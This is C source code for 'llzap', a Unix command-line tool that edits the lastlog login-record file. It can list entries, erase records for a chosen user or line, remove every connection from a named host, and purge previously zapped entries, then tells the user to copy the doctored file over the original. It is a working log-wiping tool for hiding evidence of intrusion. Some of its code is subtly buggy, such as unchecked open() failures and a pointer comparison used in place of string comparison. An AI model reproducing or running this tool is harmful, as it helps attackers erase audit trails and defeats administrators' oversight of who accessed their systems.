#include <stdio.h>
#include <time.h>
#include <lastlog.h>
#include <fcntl.h>

char *file="/var/adm/lastlog";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
	{
	if(argv[i][0] == '-')
		{
		switch(argv[i][1])
			{
			case 'b': printents(""); break;
			case 'z': printents("Z4p"); break;
			case 'e': erase(argv[i+1]); break;
                        case 'c': erase(0,argv[i+1]); break;
			case 'f': file=argv[i+1]; break;
			case 'u': printents(argv[i+1]); break;
			case 'a': printents("*"); break;
			case 'x': remnull(argv[i+1]); break;
			default:usage();
			}
		}
	}
}

printents(name)
char *name;
{
struct lastlog utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
	{
	while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog))
		{
		if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
		(!(strcmp("Z4p",name)) && (ptr->ll_time==0)))
			printinfo(ptr);
		}
	close(fp);
	}
}

printinfo(ptr)
struct lastlog *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ll_line);
strcpy(tmpstr,ctime(&(ptr->ll_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ll_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
                if (host)
                        if (strstr(utmp.ll_host,host)) tot++;
                        else {cnt++;write(fd,&utmp,sizeof(struct lastlog));}
                if (name) {
		if (strcmp(utmp.ll_line,name)) {cnt++;
			write(fd,&utmp,sizeof(struct lastlog));}
		else { 
			if (n>0) {
				n--;cnt++;
				write(fd,&utmp,sizeof(struct lastlog));}
			else
			{
			printinfo(&utmp);
			printf("Erase entry (y/n/f(astforward))? ");
			c='a';
			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
			if (c=='f') {
				cnt++;
				write(fd,&utmp,sizeof(struct lastlog));
				printf("Fast forward how many entries? ");
				scanf("%d",&n);}
			if (c=='n') {
				cnt++;
				write(fd,&utmp,sizeof(struct lastlog));
				}
			if (c=='y') tot++;
			} 
		      }	}					
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}

remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
		if (utmp.ll_time) {
			cnt++;
			write(fd,&utmp,sizeof(struct lastlog));
		}
		else
			tot++;
	}
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: llzap -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n"); 
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}
